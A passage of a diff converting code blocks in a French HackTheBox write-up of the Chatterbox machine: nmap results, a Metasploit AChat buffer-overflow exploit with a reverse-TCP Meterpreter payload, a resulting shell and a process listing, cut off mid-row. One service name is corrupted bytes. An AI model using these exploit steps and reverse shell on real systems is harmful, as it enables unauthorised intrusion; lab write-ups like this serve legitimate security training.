@@ -7711,236 +7711,236 @@
 </table>
 <hr />
 <h3 id="nmap">Nmap</h3>
-<pre><code class="language-bash">PORT      STATE SERVICE     REASON  VERSION
-135/tcp   open  msrpc       syn-ack Microsoft Windows RPC
-139/tcp   open  netbios-ssn syn-ack Microsoft Windows netbios-ssn
-445/tcp   open  ���d5V      syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
-9255/tcp  open  http        syn-ack AChat chat system httpd
-|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
-|_http-server-header: AChat
-|_http-title: Site doesn't have a title.
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-9256/tcp  open  achat       syn-ack AChat chat system
-49152/tcp open  msrpc       syn-ack Microsoft Windows RPC
-49153/tcp open  msrpc       syn-ack Microsoft Windows RPC
-49154/tcp open  msrpc       syn-ack Microsoft Windows RPC
-49155/tcp open  msrpc       syn-ack Microsoft Windows RPC
-49156/tcp open  msrpc       syn-ack Microsoft Windows RPC
-49157/tcp open  msrpc       syn-ack Microsoft Windows RPC
-Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   2:1:0: 
-|_    Message signing enabled but not required
-| p2p-conficker: 
-|   Checking for Conficker.C or higher...
-|   Check 1 (port 38735/tcp): CLEAN (Couldn't connect)
-|   Check 2 (port 60790/tcp): CLEAN (Couldn't connect)
-|   Check 3 (port 64306/udp): CLEAN (Timeout)
-|   Check 4 (port 9559/udp): CLEAN (Failed to receive data)
-|_  0/4 checks are positive: Host is CLEAN or ports are blocked
-| smb-os-discovery: 
-|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
-|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
-|   Computer name: Chatterbox
-|   NetBIOS computer name: CHATTERBOX\x00
-|   Workgroup: WORKGROUP\x00
-|_  System time: 2023-09-07T19:49:09-04:00
-| smb2-time: 
-|   date: 2023-09-07T23:49:06
-|_  start_date: 2023-09-07T23:45:56
-|_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 4h59m59s
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">     </span>REASON<span class="w">  </span>VERSION
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc<span class="w">       </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn<span class="w"> </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>���d5V<span class="w">      </span>syn-ack<span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>Professional<span class="w"> </span><span class="m">7601</span><span class="w"> </span>Service<span class="w"> </span>Pack<span class="w"> </span><span class="m">1</span><span class="w"> </span>microsoft-ds<span class="w"> </span><span class="o">(</span>workgroup:<span class="w"> </span>WORKGROUP<span class="o">)</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="m">9255</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">        </span>syn-ack<span class="w"> </span>AChat<span class="w"> </span>chat<span class="w"> </span>system<span class="w"> </span>httpd
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="p">|</span>_http-favicon:<span class="w"> </span>Unknown<span class="w"> </span>favicon<span class="w"> </span>MD5:<span class="w"> </span>0B6115FAE5429FEB9A494BEE6B18ABBE
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>AChat
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="p">|</span>_http-title:<span class="w"> </span>Site<span class="w"> </span>doesn<span class="s1">&#39;t have a title.</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="s1">| http-methods: </span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="s1">|_  Supported Methods: GET HEAD POST OPTIONS</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="s1">9256/tcp  open  achat       syn-ack AChat chat system</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="s1">49152/tcp open  msrpc       syn-ack Microsoft Windows RPC</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="s1">49153/tcp open  msrpc       syn-ack Microsoft Windows RPC</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="s1">49154/tcp open  msrpc       syn-ack Microsoft Windows RPC</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="s1">49155/tcp open  msrpc       syn-ack Microsoft Windows RPC</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="s1">49156/tcp open  msrpc       syn-ack Microsoft Windows RPC</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="s1">49157/tcp open  msrpc       syn-ack Microsoft Windows RPC</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="s1">Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="s1">Host script results:</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="s1">| smb2-security-mode: </span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="s1">|   2:1:0: </span>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="s1">|_    Message signing enabled but not required</span>
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="s1">| p2p-conficker: </span>
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="s1">|   Checking for Conficker.C or higher...</span>
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="s1">|   Check 1 (port 38735/tcp): CLEAN (Couldn&#39;</span>t<span class="w"> </span>connect<span class="o">)</span>
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="p">|</span><span class="w">   </span>Check<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="o">(</span>port<span class="w"> </span><span class="m">60790</span>/tcp<span class="o">)</span>:<span class="w"> </span>CLEAN<span class="w"> </span><span class="o">(</span>Couldn<span class="err">&#39;</span>t<span class="w"> </span>connect<span class="o">)</span>
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="p">|</span><span class="w">   </span>Check<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">(</span>port<span class="w"> </span><span class="m">64306</span>/udp<span class="o">)</span>:<span class="w"> </span>CLEAN<span class="w"> </span><span class="o">(</span>Timeout<span class="o">)</span>
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="p">|</span><span class="w">   </span>Check<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="o">(</span>port<span class="w"> </span><span class="m">9559</span>/udp<span class="o">)</span>:<span class="w"> </span>CLEAN<span class="w"> </span><span class="o">(</span>Failed<span class="w"> </span>to<span class="w"> </span>receive<span class="w"> </span>data<span class="o">)</span>
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="p">|</span>_<span class="w">  </span><span class="m">0</span>/4<span class="w"> </span>checks<span class="w"> </span>are<span class="w"> </span>positive:<span class="w"> </span>Host<span class="w"> </span>is<span class="w"> </span>CLEAN<span class="w"> </span>or<span class="w"> </span>ports<span class="w"> </span>are<span class="w"> </span>blocked
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="p">|</span><span class="w"> </span>smb-os-discovery:<span class="w"> </span>
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="p">|</span><span class="w">   </span>OS:<span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>Professional<span class="w"> </span><span class="m">7601</span><span class="w"> </span>Service<span class="w"> </span>Pack<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>Professional<span class="w"> </span><span class="m">6</span>.1<span class="o">)</span>
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a><span class="p">|</span><span class="w">   </span>OS<span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows_7::sp1:professional
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="p">|</span><span class="w">   </span>Computer<span class="w"> </span>name:<span class="w"> </span>Chatterbox
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="p">|</span><span class="w">   </span>NetBIOS<span class="w"> </span>computer<span class="w"> </span>name:<span class="w"> </span>CHATTERBOX<span class="se">\x</span><span class="m">00</span>
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="p">|</span><span class="w">   </span>Workgroup:<span class="w"> </span>WORKGROUP<span class="se">\x</span><span class="m">00</span>
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a><span class="p">|</span>_<span class="w">  </span>System<span class="w"> </span>time:<span class="w"> </span><span class="m">2023</span>-09-07T19:49:09-04:00
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a><span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
+</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a><span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2023</span>-09-07T23:49:06
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a><span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span><span class="m">2023</span>-09-07T23:45:56
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a><span class="p">|</span>_clock-skew:<span class="w"> </span>mean:<span class="w"> </span>6h20m01s,<span class="w"> </span>deviation:<span class="w"> </span>2h18m36s,<span class="w"> </span>median:<span class="w"> </span>4h59m59s
+</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a><span class="p">|</span><span class="w"> </span>smb-security-mode:<span class="w"> </span>
+</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a><span class="p">|</span><span class="w">   </span>account_used:<span class="w"> </span>guest
+</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a><span class="p">|</span><span class="w">   </span>authentication_level:<span class="w"> </span>user
+</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a><span class="p">|</span><span class="w">   </span>challenge_response:<span class="w"> </span>supported
+</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a><span class="p">|</span>_<span class="w">  </span>message_signing:<span class="w"> </span>disabled<span class="w"> </span><span class="o">(</span>dangerous,<span class="w"> </span>but<span class="w"> </span>default<span class="o">)</span>
+</span></code></pre></div>
 <h3 id="exploit">Exploit</h3>
 <p>On voit un service "AChat" (inconnu au bataillon): ça a l'air de répondre à du http, je tente d'aller dessus avec mon brave firefox mais... rien.</p>
 <p>Un searchsploit sur AChat montre un buffer overflow possible sur une des versions. Pourquoi pas !
 Un module metasploit semble exister, mais il n'est pas très coopératif à première vue:</p>
-<pre><code class="language-bash">[-] Exploit failed: windows/meterpreter/reverse_tcp: All encoders failed to encode.
-[*] Exploit completed, but no session was created.
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Exploit<span class="w"> </span>failed:<span class="w"> </span>windows/meterpreter/reverse_tcp:<span class="w"> </span>All<span class="w"> </span>encoders<span class="w"> </span>failed<span class="w"> </span>to<span class="w"> </span>encode.
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Exploit<span class="w"> </span>completed,<span class="w"> </span>but<span class="w"> </span>no<span class="w"> </span>session<span class="w"> </span>was<span class="w"> </span>created.
+</span></code></pre></div>
 <p>Une petite recherche me permet de voir que le souci n'apparait plus en changeant le type de payload:</p>
-<pre><code class="language-bash">set payload windows/meterpreter/reverse_tcp_allports
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/meterpreter/reverse_tcp_allports
+</span></code></pre></div>
 <p>Et effectivement j'obtiens bien une connexion mais... elle meurt quelques secondes après. Tristesse.</p>
-<pre><code class="language-bash">msf6 exploit(windows/misc/achat_bof) &gt; exploit
-
-[*] Started reverse TCP handler on 10.10.16.13:1 
-[*] Sending stage (175686 bytes) to 10.10.10.74
-[*] Meterpreter session 2 opened (10.10.16.13:1 -&gt; 10.10.10.74:49159) at 2023-09-07 21:04:15 +0200
-
-meterpreter &gt; shell
-Process 2488 created.
-Channel 1 created.
-Microsoft Windows [Version 6.1.7601]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-C:\Windows\system32&gt;
-[*] 10.10.10.74 - Meterpreter session 2 closed.  Reason: Died
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>msf6<span class="w"> </span>exploit<span class="o">(</span>windows/misc/achat_bof<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>exploit
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Started<span class="w"> </span>reverse<span class="w"> </span>TCP<span class="w"> </span>handler<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.10.16.13:1<span class="w"> </span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Sending<span class="w"> </span>stage<span class="w"> </span><span class="o">(</span><span class="m">175686</span><span class="w"> </span>bytes<span class="o">)</span><span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.10.10.74
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Meterpreter<span class="w"> </span>session<span class="w"> </span><span class="m">2</span><span class="w"> </span>opened<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.16.13:1<span class="w"> </span>-&gt;<span class="w"> </span><span class="m">10</span>.10.10.74:49159<span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-09-07<span class="w"> </span><span class="m">21</span>:04:15<span class="w"> </span>+0200
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>shell
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>Process<span class="w"> </span><span class="m">2488</span><span class="w"> </span>created.
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>Channel<span class="w"> </span><span class="m">1</span><span class="w"> </span>created.
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="o">[</span>Version<span class="w"> </span><span class="m">6</span>.1.7601<span class="o">]</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>Copyright<span class="w"> </span><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2009</span><span class="w"> </span>Microsoft<span class="w"> </span>Corporation.<span class="w">  </span>All<span class="w"> </span>rights<span class="w"> </span>reserved.
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="m">10</span>.10.10.74<span class="w"> </span>-<span class="w"> </span>Meterpreter<span class="w"> </span>session<span class="w"> </span><span class="m">2</span><span class="w"> </span>closed.<span class="w">  </span>Reason:<span class="w"> </span>Died
+</span></code></pre></div>
 <p>Je re-tente l'exploit, juste le temps de lancer une commande "ps":</p>
-<pre><code class="language-bash">meterpreter &gt; ps
-
-Process List
-============
-
- PID   PPID  Name            Arch  Session  User               Path
- ---   ----  ----            ----  -------  ----               ----
- 0     0     [System Proces
-             s]
- 4     0     System
- 212   3860  CompatTelRunne
-             r.exe
- 232   4     smss.exe
- 288   576   rundll32.exe    x86   1        CHATTERBOX\Alfred  C:\Windows\system32\rundll32.ex
-                                                               e
- 312   304   csrss.exe
- 352   304   wininit.exe
- 364   344   csrss.exe
- 420   344   winlogon.exe
- 456   352   services.exe
- 464   352   lsass.exe
- 472   352   lsm.exe
- 576   456   svchost.exe
- 592   920   wuauclt.exe     x86   1        CHATTERBOX\Alfred  C:\Windows\system32\wuauclt.exe
- 640   456   vm3dservice.ex
-             e
- 664   456   svchost.exe
- 716   456   svchost.exe
- 792   456   svchost.exe
- 872   456   svchost.exe
- 920   456   svchost.exe
- 968   456   svchost.exe
- 984   456   svchost.exe
- 1076  288   dinotify.exe    x86   1        CHATTERBOX\Alfred  C:\Windows\System32\dinotify.ex
-                                                               e
- 1104  456   svchost.exe
- 1236  456   spoolsv.exe
- 1272  456   svchost.exe
- 1400  456   taskhost.exe    x86   1        CHATTERBOX\Alfred  C:\Windows\system32\taskhost.ex
-                                                               e
- 1424  456   svchost.exe
- 1504  456   sppsvc.exe
- 1548  792   dwm.exe         x86   1        CHATTERBOX\Alfred  C:\Windows\system32\Dwm.exe
- 1572  1504  explorer.exe    x86   1        CHATTERBOX\Alfred  C:\Windows\Explorer.EXE
- 1696  1572  vm3dservice.ex  x86   1        CHATTERBOX\Alfred  C:\Windows\System32\vm3dservice
-             e                                                 .exe
- 1704  1572  vmtoolsd.exe    x86   1        CHATTERBOX\Alfred  C:\Program Files\VMware\VMware
-                                                               Tools\vmtoolsd.exe
- 1824  456   VGAuthService.
-             exe
- 1852  456   vmtoolsd.exe
- 1872  312   conhost.exe
- 2100  456   dllhost.exe
- 2160  576   WmiPrvSE.exe
- 2344  456   msdtc.exe
- 2540  456   SearchIndexer.
-             exe
- 2752  3052  AChat.exe       x86   1        CHATTERBOX\Alfred  c:\Program Files\AChat\AChat.ex
-                                                               e
- 3164  456   svchost.exe
- 3188  920   taskeng.exe     x86   1        CHATTERBOX\Alfred  C:\Windows\system32\taskeng.exe
- 3316  576   WmiPrvSE.exe
- 3836  576   dllhost.exe     x86   1        CHATTERBOX\Alfred  C:\Windows\system32\DllHost.exe
- 3860  456   CompatTelRunne
-             r.exe
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>ps
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>Process<span class="w"> </span><span class="nv">List</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="o">============</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w"> </span>PID<span class="w">   </span>PPID<span class="w">  </span>Name<span class="w">            </span>Arch<span class="w">  </span>Session<span class="w">  </span>User<span class="w">               </span>Path
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w"> </span>---<span class="w">   </span>----<span class="w">  </span>----<span class="w">            </span>----<span class="w">  </span>-------<span class="w">  </span>----<span class="w">               </span>----
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w"> </span><span class="m">0</span><span class="w">     </span><span class="m">0</span><span class="w">     </span><span class="o">[</span>System<span class="w"> </span>Proces
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">             </span>s<span class="o">]</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w"> </span><span class="m">4</span><span class="w">     </span><span class="m">0</span><span class="w">     </span>System
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w"> </span><span class="m">212</span><span class="w">   </span><span class="m">3860</span><span class="w">  </span>CompatTelRunne
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">             </span>r.exe
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w"> </span><span class="m">232</span><span class="w">   </span><span class="m">4</span><span class="w">     </span>smss.exe
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="w"> </span><span class="m">288</span><span class="w">   </span><span class="m">576</span><span class="w">   </span>rundll32.exe<span class="w">    </span>x86<span class="w">   </span><span class="m">1</span><span class="w">        </span>CHATTERBOX<span class="se">\A</span>lfred<span class="w">  </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\r</span>undll32.ex
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="w">                                                               </span>e
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="w"> </span><span class="m">312</span><span class="w">   </span><span class="m">304</span><span class="w">   </span>csrss.exe
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="w"> </span><span class="m">352</span><span class="w">   </span><span class="m">304</span><span class="w">   </span>wininit.exe
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="w"> </span><span class="m">364</span><span class="w">   </span><span class="m">344</span><span class="w">   </span>csrss.exe
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="w"> </span><span class="m">420</span><span class="w">   </span><span class="m">344</span><span class="w">   </span>winlogon.exe
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="w"> </span><span class="m">456</span><span class="w">   </span><span class="m">352</span><span class="w">   </span>services.exe
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="w"> </span><span class="m">464</span><span class="w">   </span><span class="m">352</span><span class="w">   </span>lsass.exe
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="w"> </span><span class="m">472</span><span class="w">   </span><span class="m">352</span><span class="w">   </span>lsm.exe
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="w"> </span><span class="m">576</span><span class="w">   </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a><span class="w"> </span><span class="m">592</span><span class="w">   </span><span class="m">920</span><span class="w">   </span>wuauclt.exe<span class="w">     </span>x86<span class="w">   </span><span class="m">1</span><span class="w">        </span>CHATTERBOX<span class="se">\A</span>lfred<span class="w">  </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>uauclt.exe
+</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a><span class="w"> </span><span class="m">640</span><span class="w">   </span><span class="m">456</span><span class="w">   </span>vm3dservice.ex
+</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a><span class="w">             </span>e
+</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a><span class="w"> </span><span class="m">664</span><span class="w">   </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a><span class="w"> </span><span class="m">716</span><span class="w">   </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a><span class="w"> </span><span class="m">792</span><span class="w">   </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a><span class="w"> </span><span class="m">872</span><span class="w">   </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a><span class="w"> </span><span class="m">920</span><span class="w">   </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a><span class="w"> </span><span class="m">968</span><span class="w">   </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a><span class="w"> </span><span class="m">984</span><span class="w">   </span><span class="m">456</span><span class="w">   </span>svchost.exe
+</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a><span class="w"> </span><span class="m">1076</span><span class="w">  </span><span class="m">288</span><span class="w">   </span>dinotify.exe<span class="w">    </span>x86<span class="w">   </span><span class="m">1</span><span class="w">        </span>CHATTERBOX<span class="se">\A</span>lfred<span class="w">  </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\d</span>inotify.ex
